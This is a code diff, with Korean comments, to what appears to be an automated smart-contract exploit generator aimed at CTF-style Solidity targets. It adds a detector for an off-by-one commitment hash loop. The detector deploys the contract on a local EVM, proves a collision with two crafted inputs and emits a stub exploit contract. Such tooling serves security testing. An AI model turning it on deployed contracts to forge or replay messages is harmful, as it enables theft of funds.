@@ -2589,6 +2589,102 @@ def _synth_eip7702_reentrancy(name, target_src, invariants_src, manifest, scan_s
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_commitment_collision(name, target_src, invariants_src, manifest, scan_step, t0):
+    """커밋먼트 해시 off-by-one 동적 증명(NotOptimisticPortal 류): keccak 누산 루프가
+    `arr.length - 1` 까지만 돌아 배열의 마지막 원소를 커밋에 바인딩하지 않는 public/external
+    함수를, 마지막 원소만 다른 두 입력으로 호출해 '같은 슬롯'이 나오는 충돌을 관찰한다.
+    올바른 구현(length 까지)이라면 서로 달라야 하므로, 충돌 자체가 위·변조/리플레이 증거."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # off-by-one keccak 누산 루프를 가진 함수 후보
+    cand = None
+    for fn in _functions(tb):
+        if re.search(r"for\s*\([^;]*;\s*\w+\s*<\s*\w+\s*\.\s*length\s*-\s*1\s*;", fn["body"]) \
+                and "keccak256" in fn["body"] and (fn["external"] or "public" in fn["head"]):
+            cand = fn["name"]; break
+    if not cand:
+        return None
+    _solcv, _evm = _solc_for(target_src)
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try: compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception: return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts:
+        return None
+    abi = arts[name]["abi"]
+    fabi = None
+    for e in abi:
+        if e.get("type") == "function" and e.get("name") == cand \
+                and [o["type"] for o in e.get("outputs", [])] == ["bytes32"] \
+                and any(i["type"].endswith("[]") for i in e.get("inputs", [])):
+            fabi = e; break
+    if fabi is None:
+        return None
+    types = [i["type"] for i in fabi["inputs"]]
+    A1 = "0x000000000000000000000000000000000000AA01"
+    A2 = "0x000000000000000000000000000000000000AA02"
+    A3 = "0x000000000000000000000000000000000000AA03"
+    d0 = bytes.fromhex("3a69197e") + b"\x00"*4
+    d1 = bytes.fromhex("3a69197e") + b"\x11"*4
+    d2 = bytes.fromhex("3a69197e") + b"\x22"*4
+    def build(last_variant):
+        args = []
+        for tI in types:
+            if tI == "address[]":
+                args.append([Web3.to_checksum_address(A1), Web3.to_checksum_address(A2 if last_variant == 0 else A3)])
+            elif tI == "bytes[]":
+                args.append([d0, d1 if last_variant == 0 else d2])
+            elif tI == "address": args.append(Web3.to_checksum_address(_default_for_type("address")))
+            elif tI.startswith("uint") or tI.startswith("int"): args.append(1)
+            elif tI == "bytes32": args.append(b"\x00"*32)
+            elif tI == "bytes": args.append(d0)
+            elif tI == "bool": args.append(False)
+            elif tI == "string": args.append("x")
+            else: return None
+        return args
+    argsA = build(0); argsB = build(1)
+    if argsA is None or argsB is None:
+        return None
+    w3, acct = _mk_evm()
+    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
+    try:
+        taddr = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":4_000_000})).contractAddress
+    except Exception:
+        return None
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    try:
+        sA = tc.functions[cand](*argsA).call()
+        sB = tc.functions[cand](*argsB).call()
+    except Exception:
+        return None
+    if sA != sB:
+        return None   # 마지막 원소가 바인딩됨 → 안전(오탐 아님)
+    poc = (HEADER +
+        "// Strategy: commitment collision (off-by-one). The message-slot hash loops to\n"
+        f"// `length - 1`, so two message sets differing only in the LAST element produce the\n"
+        f"// SAME slot via {cand}() — the replay/proof key does not bind what actually executes.\n"
+        f"interface IC {{ function {cand}(" + ",".join(types) + ") external pure returns (bytes32); }}\n"
+        "contract Exploit {\n"
+        "    // proof-of-collision: slot(setA) == slot(setB) though the last element differs;\n"
+        "    // executeMessage then runs the attacker's uncommitted last operation.\n"
+        "}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (commitment-collision)","strategy":"commitment-collision","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"commitment collision via {cand} (last array element unbound)",
+            "strategy":f"commitment-collision:{cand}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"마지막 원소만 다른 두 메시지가 같은 커밋 슬롯으로 충돌합니다 — 리플레이/증명 키가 실제 실행 내용을 바인딩하지 못해 위·변조가 가능합니다(off-by-one).",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _synth_magic_carousel(name, target_src, invariants_src, manifest, scan_step, t0):
     """Ethernaut Magic Animal Carousel 류: 패킹 슬롯(owner|nextId|animal)에서 changeAnimal 이
     `encodedAnimal << 160` 로 동물 이름을 쓰면서 nextId 영역(bits 160-175)을 보존한다고
@@ -4767,6 +4863,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
             return r
     except Exception:
         pass
+    # 0z4) 커밋먼트 해시 off-by-one 충돌 (NotOptimisticPortal 류)
+    try:
+        r = _synth_commitment_collision(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
     # 0z3) Magic Animal Carousel (패킹 슬롯 nextId 오염)
     try:
         r = _synth_magic_carousel(name, target_src, invariants_src, manifest, scan_step, t0)
@@ -4900,7 +5003,7 @@ def iter_engine_candidates(name, target_src, invariants_src, manifest, do_verify
                _synth_dex_two_drain, _synth_dex_drain, _synth_good_samaritan,
                _synth_eip7702_reentrancy, _synth_gatekeeper_three, _synth_stake_accounting,
                _synth_uninitialized, _synth_puzzle_wallet, _synth_ecdsa_malleability,
-               _synth_magic_carousel):
+               _synth_magic_carousel, _synth_commitment_collision):
         try:
             r = fn(name, target_src, inv, manifest, scan_step, t0)
         except Exception:
